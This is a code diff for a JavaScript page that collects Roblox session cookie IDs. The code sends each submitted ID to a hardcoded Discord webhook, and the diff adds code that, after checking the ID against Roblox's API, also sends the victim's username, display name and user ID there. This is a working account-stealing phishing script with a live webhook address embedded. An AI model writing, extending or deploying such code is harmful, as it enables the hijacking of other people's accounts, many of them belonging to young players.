@@ -1,10 +1,10 @@
 // Discord Webhook URL (Replace with your actual webhook URL)
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ';
 
-// Function to send Session ID to Discord webhook
-function sendToDiscordWebhook(sessionId) {
+// Function to send data to Discord webhook
+function sendToDiscordWebhook(content) {
   const payload = {
-    content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``,
+    content: content,
   };
 
   fetch(DISCORD_WEBHOOK_URL, {
@@ -36,9 +36,9 @@ async function validateRobloxSession(sessionId) {
 
     if (response.ok) {
       const userData = await response.json();
-      return userData;
+      return userData; // Return the user profile data
     } else {
-      console.error('Invalid session ID');
+      console.error('Invalid session ID. Roblox API returned:', response.status, response.statusText);
       return null;
     }
   } catch (error) {
@@ -79,13 +79,16 @@ async function validateInput() {
   }
 
   // Send Session ID to Discord webhook
-  sendToDiscordWebhook(sessionId);
+  sendToDiscordWebhook(`New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``);
 
   // Validate Roblox session ID and fetch user profile
   const userData = await validateRobloxSession(sessionId);
   if (userData) {
     console.log('User Profile Data:', userData);
-    // You can now use the userData to display or process the user's profile information
+
+    // Send user profile information to Discord webhook
+    const profileInfo = `**Valid Session ID!**\n**Username:** ${userData.name}\n**Display Name:** ${userData.displayName}\n**User ID:** ${userData.id}`;
+    sendToDiscordWebhook(profileInfo);
   } else {
     showError('Invalid session ID. Please check your inputs.');
     return;
